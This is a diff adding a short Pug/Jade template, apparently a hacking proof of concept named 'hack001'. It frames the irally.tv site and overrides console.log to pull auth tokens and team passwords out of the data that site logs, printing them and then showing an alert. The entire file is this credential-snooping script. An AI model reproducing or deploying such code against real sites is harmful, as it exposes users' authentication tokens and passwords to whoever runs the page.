@@ -1,0 +1,11 @@
+extends layouts/hack001
+
+block content
+  h1= title
+  iframe(src="http://irally.tv/#startingLine", id="irif")
+  script(type="text/javascript" src="http://irally.tv/js/libs/jquery/jquery-min.js")
+  script.
+    var myIFrame  = $('iframe#irif');
+    window.console.log1 = window.console.log
+    window.console.log  = function( data ) { if( data && data.authToken > '' ) { console.log1( "Your auth token is '" + data.authToken + "'" ); } else if( data && data._previousAttributes && data._previousAttributes.password > '' ) { console.log1("Your team password is '" + data._previousAttributes.password + "'"); } else { console.log1( 'Miscellanous call!'); console.log1(data); } }
+    alert('Hey you!');
